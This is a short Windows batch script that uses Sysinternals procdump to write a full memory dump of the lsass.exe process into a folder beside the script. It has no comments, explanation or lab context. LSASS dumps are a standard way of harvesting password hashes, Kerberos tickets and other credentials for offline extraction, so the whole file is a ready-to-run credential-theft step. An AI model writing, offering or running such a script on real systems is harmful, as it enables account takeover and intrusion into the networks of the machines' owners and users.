set "str1=%~dp0"
set "str2=SysinternalsSuite"
set "strpath=%str1%%str2%"
pause
%strpath%\procdump.exe -accepteula -ma lsass.exe %strpath% 2>&1
pause